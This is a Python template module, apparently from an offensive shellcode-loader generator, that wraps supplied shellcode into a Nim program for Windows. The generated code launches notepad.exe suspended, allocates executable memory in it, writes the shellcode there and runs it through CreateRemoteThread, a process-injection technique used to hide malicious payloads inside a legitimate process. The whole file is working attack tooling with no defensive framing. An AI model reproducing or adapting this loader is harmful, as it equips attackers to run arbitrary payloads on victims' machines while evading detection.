from ClassCongregation import BinaryDataTypeConversion
import ast
__heading__="Nim-EXE-Windows-Null-Yes-CreateRemoteThread-20210902-11/72"
__build__=""
__language__=".nim"
__process__=".exe"

def main(**kwargs):
    Shellcode=kwargs.get("shellcode")
    Include=kwargs.get("include")
    AllCode=kwargs.get("all_code")
    AllFunctionName = kwargs.get("all_function_name")
    Number,BinaryData=BinaryDataTypeConversion().StringToNim(ast.literal_eval(repr(Shellcode).replace("\\\\", "\\")))#对数据进行类型转换
    Code ="""
import winim/lean
import osproc

proc main[I, T](shellcode: array[I, T]): void =
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() 
    defer: tProcess.close()
    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

when defined(windows):
    var shellcode: array["""+Number+""", byte] = """+BinaryData+"""
    when isMainModule:
        main(shellcode)
"""

    return Code


